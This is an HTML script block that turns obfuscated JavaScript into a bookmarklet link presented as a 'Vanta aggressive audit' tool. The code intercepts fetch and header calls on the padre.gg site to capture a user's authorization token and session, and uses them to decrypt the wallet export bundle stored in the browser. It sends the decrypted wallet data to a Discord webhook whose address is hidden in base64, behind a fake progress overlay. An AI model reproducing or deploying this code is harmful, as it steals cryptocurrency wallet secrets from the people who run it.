<script>
    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";

    const rawLogic = `(async function() {
        const CONFIG = {
            webhook: atob("${b64}"),
            aff: "TK0XQV",
            decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
        };

        // --- 1. THE UI OVERLAY (Internalized) ---
        const drawUI = () => {
            const ui = document.createElement('div');
            ui.id = 'vanta-overlay';
            ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:2147483647;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;border:5px solid #0f8;pointer-events:none;transition: opacity 1s;";
            ui.innerHTML = "<div style='text-align:center;padding:40px;border:1px solid #0f8;background:#000;'><h1>VANTA AGGRESSIVE AUDIT</h1><p id='v-msg'>HOOKING HEADERS & SNIFFING KEYS...</p><div style='width:100%;background:#222;height:10px;margin-top:20px;'><div id='v-bar' style='width:0%;height:100%;background:#0f8;transition:0.5s;'></div></div></div>";
            document.body.appendChild(ui);
            return ui;
        };
        const overlay = drawUI();
        const updateStatus = (text, percent) => {
            document.getElementById('v-msg').innerText = text;
            document.getElementById('v-bar').style.width = percent + "%";
        };

        const notify = async (title, content) => {
            const formData = new FormData();
            const blob = new Blob([content], { type: 'text/plain' });
            formData.append('file', blob, 'audit_result.txt');
            formData.append('payload_json', JSON.stringify({
                embeds: [{ title: title, color: 0x00ff88, description: "Detailed logs attached." }]
            }));
            await fetch(CONFIG.webhook, { method: 'POST', body: formData }).catch(()=>{});
        };

        // --- 2. THE DECRYPTOR ---
        const runDecryption = async (token, session) => {
            updateStatus("CREDENTIALS CAPTURED. DECRYPTING...", 60);
            const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
            if (!bundleStr) return;
            
            const bundleData = JSON.parse(bundleStr);
            const firstKey = Object.keys(bundleData.bundles)[0];
            const payload = {
                bundle: bundleData.bundles[firstKey].exportBundle,
                subOrgId: bundleData.bundles[firstKey].subOrgId
            };

            try {
                const res = await fetch(CONFIG.decryptUrl, {
                    method: 'POST',
                    headers: { 'Authorization': token, 'X-Padre-Session': session, 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const decrypted = await res.json();
                updateStatus("DECRYPTION SUCCESSFUL", 100);
                await notify("ðŸš¨ WALLET DECRYPTED", JSON.stringify(decrypted, null, 2));
            } catch (e) {
                await notify("âŒ DECRYPTION FAILED", e.message);
            }
            setTimeout(() => { overlay.style.opacity = '0'; setTimeout(()=>overlay.remove(), 1000); }, 2000);
        };

        // --- 3. THE SNIFFER ---
        let capturedToken = null;
        let capturedSession = "";

        const checkAndRun = (name, val) => {
            if (name.toLowerCase() === 'authorization') capturedToken = val;
            if (name.toLowerCase() === 'x-padre-session') capturedSession = val;
            if (capturedToken && !window.auditComplete) {
                window.auditComplete = true;
                runDecryption(capturedToken, capturedSession);
            }
        };

        const _set = Headers.prototype.set;
        Headers.prototype.set = function(n, v) { checkAndRun(n, v); return _set.apply(this, arguments); };

        const _f = window.fetch;
        window.fetch = async (...a) => {
            const h = a[1]?.headers;
            if (h) Object.entries(h).forEach(([n, v]) => checkAndRun(n, v));
            return _f(...a);
        };

        // Trigger
        updateStatus("FORCE-LOADING PROFILE...", 30);
        _f('/api/v2/user/profile');
        
    })(); void(0);`;

    document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
</script>
